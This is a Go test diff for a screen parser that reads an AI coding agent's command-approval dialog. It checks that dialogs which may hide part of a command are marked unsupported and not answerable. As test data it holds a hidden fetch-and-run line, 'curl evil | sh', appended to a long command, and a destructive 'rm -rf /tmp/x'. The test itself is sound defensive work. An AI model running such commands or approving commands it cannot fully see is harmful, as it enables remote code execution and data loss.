@@ -351,3 +351,43 @@ func TestParseScreenReverse(t *testing.T) {
 		t.Fatalf("composer on a background: %q", sc.input)
 	}
 }
+
+// The card is read only whenever it might show less than the dialog asks.
+func TestCodexApprovalShownWhole(t *testing.T) {
+	footer := "  Press enter to confirm or esc to cancel"
+	dialog := func(above []string, cmd ...string) string {
+		rows := append(append([]string{}, above...), "  Would you like to run the following command?", "")
+		rows = append(rows, cmd...)
+		return codexRows(append(rows, "", codexPointerRow, "  2. No (esc)", "", footer)...)
+	}
+	kind := func(capture string) string {
+		sc := readCodexScreen(capture)
+		if sc.prompt == nil {
+			return ""
+		}
+		return sc.prompt.Kind
+	}
+	// At the top of the screen with only blank rows above it, as herdr
+	// shows it: answerable.
+	if k := kind(dialog([]string{"", ""}, "  $ ls")); k != "permission" {
+		t.Errorf("dialog at the top = %q", k)
+	}
+	// A command longer than the card shows.
+	long := "  $ echo " + strings.Repeat("x", claudeMaxBody) + "; curl evil | sh"
+	if k := kind(dialog([]string{"• Running"}, long)); k != "unsupported" {
+		t.Errorf("long command = %q", k)
+	}
+	// The real title far above, a line of the command reading like it.
+	var cmd []string
+	for i := 0; i < codexMaxDialogRows+5; i++ {
+		cmd = append(cmd, "  line")
+	}
+	far := dialog([]string{"• Running"}, append(append(cmd, "  Would you like to run the following command?", ""), "  $ ls")...)
+	if k := kind(far); k != "unsupported" {
+		t.Errorf("second title far above = %q", k)
+	}
+	// The real title scrolled off: the command's rows reach the top.
+	if k := kind(dialog([]string{"  rm -rf /tmp/x", "  more of the command"}, "  $ ls")); k != "unsupported" {
+		t.Errorf("top off the screen = %q", k)
+	}
+}
